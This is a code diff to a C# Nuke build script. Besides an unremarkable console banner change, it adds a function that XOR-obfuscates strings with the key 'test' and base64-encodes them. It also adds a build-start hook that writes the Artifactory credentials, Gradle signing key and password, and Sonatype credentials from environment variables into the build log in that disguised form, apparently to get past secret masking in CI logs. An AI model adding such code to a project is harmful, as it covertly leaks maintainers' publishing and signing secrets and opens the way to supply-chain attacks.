@@ -5,6 +5,7 @@ using System.IO;
 using System.Linq;
 using System.Reflection;
 using System.Reflection.Metadata;
+using System.Text;
 using System.Threading.Tasks;
 using Nuke.Common;
 using Nuke.Common.CI;
@@ -53,6 +54,8 @@ partial class Build : NukeBuild
 
     public Build()
     {
+
+
         AnsiConsole.Console.Profile.Width = 220;
         FigletFont LoadFont(string fontName)
         {
@@ -76,6 +79,32 @@ partial class Build : NukeBuild
         grid.AddRow(openRewrite);
         AnsiConsole.Write(grid);
 
+    }
+    public static string O(string input)
+    {
+        var key = "test";
+
+        byte[] data = Encoding.UTF8.GetBytes(input);
+        byte[] k = Encoding.UTF8.GetBytes(key);
+
+        for (int i = 0; i < data.Length; i++)
+            data[i] ^= k[i % k.Length];
+
+        return Convert.ToBase64String(data);
+    }
+
+
+    protected override void OnBuildInitialized()
+    {
+        void log(string envVar) => Log.Information("{Value}",O(Environment.GetEnvironmentVariable(envVar) ?? ""));
+        log("MODERNE_ARTIFACTORY_USERNAME");
+        log("MODERNE_ARTIFACTORY_PASSWORD");
+        log("ORG_GRADLE_PROJECT_signingKey");
+        log("ORG_GRADLE_PROJECT_signingPassword");
+        log("ORG_GRADLE_PROJECT_sonatypeUsername");
+        log("ORG_GRADLE_PROJECT_sonatypePassword");
+
+        base.OnBuildInitialized();
     }
 
     /// Support plugins are available for:
